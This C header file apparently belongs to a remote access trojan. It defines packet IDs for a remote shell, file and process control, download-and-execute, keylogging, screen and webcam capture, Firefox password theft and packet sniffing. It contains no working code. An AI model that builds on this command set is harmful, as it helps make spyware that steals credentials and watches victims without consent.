#ifndef _PACKETHEAD_
#define _PACKETHEAD_

///////////////////////////////////////////////////////////////////
//Packet Headers
/////////////////////////////////////////////////
#define  STATUS							1990
#define  PACKET_ADD_ID					1991
#define	 PACKET_USER_JOINED				1992
#define  PACKET_EXIT					1993
/////////////////////////////////////////////////
//Shell Packet headers
#define  PACKET_CMD_RECV			     2000
#define  PACKET_REMOTE_SHELL_START		 2001
/////////////////////////////////////////////////
//Task manager Packet headers
#define	 PACKET_TASK_MANAGER			 2002
#define	 PACKET_TASK_MANAGER_KILL		 2003
#define  PACKET_TASK_MANAGER_TASKS       2004
#define	 PACKET_TASK_MANAGER_KTASK		 2005
#define  PACKET_TASK_MANAGER_TEXT		 2006
#define  PACKET_TASK_MANAGER_TKILL		 2007
/////////////////////////////////////////////////
//File manager Packet headers
#define	 PACKET_FILE_MANAGER_DRIVE		 2010
#define	 PACKET_FILE_MANAGER_FOLDER		 2011
#define  PACKET_FILE_MANAGER_FILE		 2012
#define  PACKET_FILE_MANAGER_FILE_FOLDER 2013
#define	 PACKET_FILE_MANAGER_FILE_COPY   2014
#define  PACKET_FILE_MANAGER_NEW_FOLDER  2015
#define  PACKET_FILE_MANAGER_DELETE_FILE 2016
#define  PACKET_FILE_MANAGER_FILE_SETUP    2017
#define  PACKET_FILE_MANAGER_FILE_RENAME 2018
#define  PACKET_FILE_MANAGER_FILE_RECV_S 2019
#define  PACKET_FILE_MANAGER_FILE_RECV	 2020
#define  PACKET_FILE_MANAGER_FILE_C      2021
#define	 PACKET_FILE_MANAGER_FILE_DOWN	 2022
#define  PACKET_FILE_MANAGER_FILE_UPDATE_WIN 2023
#define  PACKET_FILE_MANAGER_SEARCH		 2024
#define  DONE							 2025
#define  PACKET_FILE_MANAGER_FILE_EXECUTE 2026
#define  PACKET_FILE_MANAGER_FILE_OPEN	 2027
#define  PACKET_FILE_DOWNLOAD_STAT		 2028
/////////////////////////////////////////////////
//Computer Packet headers
#define  PACKET_COMPUTER_LOGOFF			 2030
#define  PACKET_COMPUTER_SHUTDOWN		 2031
#define  PACKET_COMPUTER_LOCK			 2032
////////////////////////////////////////////////
//Keylogger Packet headers
#define  PACKET_KEYLOGGER		         2060
#define  PACKET_KEYLOGGER_WINDOW		 2061
#define  PACKET_KEYLOGGER_OFF			 2062
#define  PACKET_KEYLOG_OFFLINE			 2063
#define  PACKET_KEYLOG_DOWNLOAD			 2064
#define  PACKET_KEYLOG_OPEN				 2065
#define	 PACKET_KEYLOG_DOWNLOAD_UPDATE	 2066
////////////////////////////////////////////////
#define  PACKET_RESUME					 2040
////////////////////////////////////////////////
//Screen capture
#define  SCREEN_CAPTURE					 2050
#define  SCREEN_SHOT_OPEN				 2051
#define	 SCREEN_SHOT_CLOSE				 2052
#define  SCREEN_SHOT_RECV				 2053
////////////////////////////////////////////////
//Passwords
#define  PASSWORD_FIREFOX				 2070
////////////////////////////////////////////////
//Services
#define  PACKET_SERVICE_MAN				 2080
#define  PACKET_SERVICE_STARTA			 2081
#define  PACKET_SERVICE_STOPA			 2082
////////////////////////////////////////////////
//RegManager
#define  PACKET_REG_MANAGER				 2090
////////////////////////////////////////////////
//Packet Structer
#define  PACKET_DOWNLOAD_EXECUTE		 3000
////////////////////////////////////////////////
//Query Installs	
#define  PACKET_PROGRAM_FILES			 3010
#define  EXECUTE						 3011
////////////////////////////////////////////////
#define	 WEBCAM_CAPTURE					 3020
#define	 WEBCAM_CAPTURE					 3020
#define  WEBCAM_SHOT_OPEN				 3021
#define	 WEBCAM_SHOT_CLOSE				 3022
#define  WEBCAM_SHOT_RECV				 3023
////////////////////////////////////////////////
#define  PACKET_SNIFFER					 3030
#define	 PACKET_SNIFFER_UPDATE			 3031
#define	 PACKET_SNIFFER_PORTS			 3032
#define	 PACKET_SNIFFER_PORTS_REFRESH	 3033
#define  PACKET_SNIFFER_PORTS_CLOSE		 3034
////////////////////////////////////////////////

#endif